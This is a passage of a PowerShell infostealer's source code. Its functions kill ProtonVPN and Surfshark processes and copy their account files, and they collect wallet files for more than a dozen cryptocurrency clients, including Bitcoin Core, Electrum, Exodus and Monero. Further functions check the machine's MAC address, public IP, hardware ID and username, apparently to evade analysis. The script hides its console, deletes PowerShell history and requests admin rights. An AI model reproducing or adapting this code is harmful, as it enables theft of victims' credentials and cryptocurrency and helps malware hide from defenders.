    New-Item -ItemType Directory -Force -Path $ea_session
    Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
}

function Invoke-protonvpnstealer {
    $protonvpnfolder = "$env:localappdata\protonvpn"
    if (!(Test-Path $protonvpnfolder)) {return}
    $processname = "protonvpn"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $protonvpn_account = "$folder_crypto\ProtonVPN"
    New-Item -ItemType Directory -Force -Path $protonvpn_account
    $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
    $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
    $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
    foreach ($directory in $directories) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
        Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
    }
    foreach ($file in $files) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
        Copy-Item -Path $file.FullName -Destination $destinationPath -Force
    }
    Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
}


function Invoke-surfsharkvpnstealer {
    $surfsharkvpnfolder = "$env:appdata\Surfshark"
    if (!(Test-Path $surfsharkvpnfolder)) {return}
    $processname = "Surfshark"
    try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
    $surfsharkvpn_account = "$folder_crypto\Surfshark"
    New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
    Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
}

function Invoke-Crypto_Wallets {
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
        New-Item -Path "$crypto\Armory" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$crypto\Armory" -Recurse -Force
    }
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
        New-Item -Path "$crypto\Atomic" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$crypto\Atomic" -Recurse -Force
    }
    
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
        New-Item -Path "$crypto\BitcoinCore" -ItemType Directory | Out-Null
        Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\BitcoinCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
        New-Item -Path "$crypto\bytecoin" -ItemType Directory | Out-Null
        Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$crypto\bytecoin" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
        New-Item -Path "$crypto\Coinomi" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$crypto\Coinomi" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
        New-Item -Path "$crypto\DashCore" -ItemType Directory | Out-Null
        Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\DashCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
        New-Item -Path "$crypto\Electrum" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$crypto\Electrum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
        New-Item -Path "$crypto\Ethereum" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$crypto\Ethereum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
        New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
        New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
        New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$crypto\liberty.jaxx" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
        New-Item -Path "$crypto\Litecoin" -ItemType Directory | Out-Null
        Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\Litecoin" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
        New-Item -Path "$crypto\Monero" -ItemType Directory | Out-Null
        Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$crypto\Monero" -Recurse  -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
        New-Item -Path "$crypto\Zcash" -ItemType Directory | Out-Null
        Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
    }
}

function Search-Mac ($mac_addresses) {
    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    ForEach ($mac123 in $mac_addresses) {
        if ($pc_mac -contains $mac123) {
            return $true
        }
    }
    return $false
}

function Search-IP ($ip_addresses) {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    ForEach ($ip123 in $ip_addresses) {
        if ($pc_ip -contains $ip123) {
            return $true
        }
    }
    return $false
}

function Search-HWID ($hwids) {
    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    ForEach ($hwid123 in $hwids) {
        if ($pc_hwid -contains $hwid123) {
            return $true
        }
    }
    return $false
}

function Search-Username ($usernames) {
    $pc_username = $env:USERNAME
    ForEach ($username123 in $usernames) {
        if ($pc_username -contains $username123) {
            return $true
        }
    }
    return $false
}

if (Invoke-Admin_Check -eq $true) {
    if (!($debug_mode)) {
        Hide-Console
    }
    Remove-Item (Get-PSreadlineOption).HistorySavePath
    Invoke-ANTITOTAL
    # Self-Destruct
    # Remove-Item $PSCommandPath -Force 
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}

if ($debug_mode) {
    Start-Sleep -s 10000
}
